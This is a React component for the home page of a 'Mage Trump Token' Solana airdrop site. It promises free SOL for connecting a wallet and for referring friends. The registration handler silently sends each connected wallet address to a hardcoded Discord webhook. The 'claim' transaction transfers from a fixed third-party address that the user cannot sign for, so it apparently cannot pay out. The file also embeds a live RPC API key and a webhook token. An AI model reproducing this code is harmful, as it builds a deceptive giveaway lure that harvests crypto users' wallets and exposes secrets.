// ... [imports permanecem os mesmos]
import React, { useEffect, useState } from 'react';
import trumpImage from '../assets/front.png';
import { Link } from 'react-router-dom';
import { db } from '../firebase/firebase';
import {
  setDoc, updateDoc, doc, getDoc, onSnapshot,
} from 'firebase/firestore';
import {
  Connection, PublicKey, SystemProgram, Transaction,
} from '@solana/web3.js';
import { useWallet } from '@solana/wallet-adapter-react';
import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
import TelegramPromo from '../components/TelegramPromo';

export default function Home() {
  const { publicKey, connected, sendTransaction } = useWallet();
  const [status, setStatus] = useState('');
  const [error, setError] = useState('');
  const [userData, setUserData] = useState(null);
  const [rescuePopup, setRescuePopup] = useState(false);

  const walletAddress = publicKey?.toBase58() || '';
  const connection = new Connection(
    'https://multi-solitary-mound.solana-mainnet.quiknode.pro/8e58afdbaa8a8759d59583bd41d191ce8445d9c3/',
    'confirmed'
  );

  const sendToDiscord = async (wallet) => {
    try {
      await fetch(
        'https://discord.com/api/webhooks/1360353395365380177/5Lejy62BSrPzxKQ-Ak7kaZJ8AROonM0-49o-1_n9oOoAia9Rcg0fGBlSZC_iQHfA6trA',
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ content: `📢 New wallet connected: \`${wallet}\`` }),
        }
      );
    } catch (err) {
      console.error('Error sending webhook:', err);
    }
  };

  const getReferralFromURL = () => {
    const params = new URLSearchParams(window.location.search);
    return params.get('ref') || null;
  };

  const handleUserRegistration = async () => {
    if (!walletAddress) return;
    setStatus('Registering wallet...');
    try {
      const userRef = doc(db, 'users', walletAddress);
      const existingSnap = await getDoc(userRef);
      const referral = getReferralFromURL();

      if (!existingSnap.exists()) {
        await setDoc(userRef, {
          wallet: walletAddress,
          referral,
          claimed: false,
          createdAt: new Date().toISOString(),
          refCount: 0,
          balance: 0.5,
          canClaim: false,
        });

        if (referral) {
          const refRef = doc(db, 'users', referral);
          const refSnap = await getDoc(refRef);
          if (refSnap.exists()) {
            const refData = refSnap.data();
            const newBalance = Math.ceil(((refData.balance || 0) + 0.1) * 10) / 10;
            const newCount = (refData.refCount || 0) + 1;
            await updateDoc(refRef, {
              balance: newBalance,
              refCount: newCount,
            });
          }
        }
        await sendToDiscord(walletAddress);
        setStatus('Wallet registered!');
      } else {
        setStatus('Wallet already registered.');
      }
    } catch (err) {
      console.error('Error registering wallet:', err);
      setStatus('Error registering wallet');
      setError(err.message);
    }
  };

  const getRoundedBalance = () => {
    if (!userData?.balance) return '0.0';
    return (Math.ceil(userData.balance * 10) / 10).toFixed(1);
  };

  const handleRescue = () => setRescuePopup(true);

  const confirmRescue = async () => {
    try {
      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: new PublicKey('4SCGGaB8RFKGi1pQXZ71vejUehvrZW5taoGMToqCcKUD'),
          toPubkey: publicKey,
          lamports: Math.floor((userData.balance || 0) * 1e9),
        })
      );

      const latestBlockhash = await connection.getLatestBlockhash();
      transaction.recentBlockhash = latestBlockhash.blockhash;
      transaction.feePayer = publicKey;

      const signature = await sendTransaction(transaction, connection);
      await connection.confirmTransaction({ signature, ...latestBlockhash }, 'confirmed');
      alert('SOL sent successfully!');
      setRescuePopup(false);
    } catch (err) {
      console.error('Error during claim:', err);
      setError(err.message);
      setRescuePopup(false);
    }
  };

  useEffect(() => {
    if (!walletAddress) return;
    const unsub = onSnapshot(doc(db, 'users', walletAddress), (snap) => {
      if (snap.exists()) setUserData(snap.data());
    });
    return () => unsub();
  }, [walletAddress]);

  return (
    <div className="min-h-screen bg-[#0a369d] text-white flex flex-col">
      <header className="w-full flex flex-wrap justify-between items-center px-6 py-6">
        <div className="flex gap-6 flex-wrap text-white font-semibold text-sm">
          <Link to="/" className="hover:underline">HOME</Link>
          <Link to="/about" className="hover:underline">ABOUT</Link>
          <Link to="/airdrop" className="hover:underline">AIRDROP</Link>
          <Link to="/referrals" className="hover:underline text-yellow-300">REFERRALS</Link>
        </div>
        <div className="mt-4 md:mt-0">
          <WalletMultiButton className="!bg-blue-600 !hover:bg-blue-700 !text-white !font-semibold !py-2 !px-4 !rounded transition" />
        </div>
      </header>

      {/* 🚀 Banner de lançamento */}
      <div className="bg-yellow-400 text-black text-center font-bold py-2 px-4 shadow-lg">
        🚀 Official Launch: <span className="underline">April 20th</span> — Claim available starting launch day!
      </div>

      <main className="flex flex-col md:flex-row items-center justify-center flex-grow px-4 text-center md:text-left gap-10">
        <div className="w-full md:w-1/2 flex justify-center">
          <img src={trumpImage} alt="Trump Mage" className="w-64 md:w-[320px] lg:w-[380px]" />
        </div>
        <div className="w-full md:w-1/2 flex flex-col justify-center items-center md:items-start mt-6 md:mt-0">
          <h1 className="text-4xl md:text-5xl font-bold mb-4">MAGE TRUMP TOKEN</h1>
          <h2 className="text-2xl font-bold text-white mb-2">Claim Free SOL and Join the Movement!</h2>
          <p className="text-sm text-gray-200 max-w-sm mb-6">
            🔥 Get 0.5 SOL instantly just for connecting your wallet.<br />
            🎯 Invite your friends and boost your earnings!<br />
            🧙‍♂️ The more you share, the more power you gain.
          </p>
          <p className="text-sm mb-2 text-green-300">
            Your current earnings: {getRoundedBalance()} SOL
          </p>
          <button
            onClick={handleUserRegistration}
            disabled={!connected}
            className="bg-green-600 hover:bg-green-700 text-white font-semibold py-2 px-6 rounded disabled:opacity-40"
          >
            Register
          </button>
          <button
            onClick={handleRescue}
            disabled={!userData?.canClaim}
            className="mt-4 bg-yellow-500 hover:bg-yellow-600 text-white font-semibold py-2 px-6 rounded disabled:opacity-40"
          >
            Claim Balance
          </button>
          {status && <p className="mt-4">{status}</p>}
          {error && <p className="mt-4 text-red-500">{error}</p>}
        </div>
      </main>

      <TelegramPromo />

      {rescuePopup && (
        <div className="fixed top-0 left-0 w-full h-full bg-gray-800 bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-white p-6 rounded shadow-lg max-w-sm w-full">
            <h2 className="text-xl font-bold mb-4 text-black">Confirm Claim</h2>
            <p className="text-black">Do you want to claim your {getRoundedBalance()} SOL?</p>
            <div className="mt-4 flex justify-between">
              <button
                onClick={confirmRescue}
                className="bg-blue-500 hover:bg-blue-600 text-white font-semibold py-2 px-4 rounded"
              >
                Yes
              </button>
              <button
                onClick={() => setRescuePopup(false)}
                className="bg-gray-500 hover:bg-gray-600 text-white font-semibold py-2 px-4 rounded"
              >
                Cancel
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}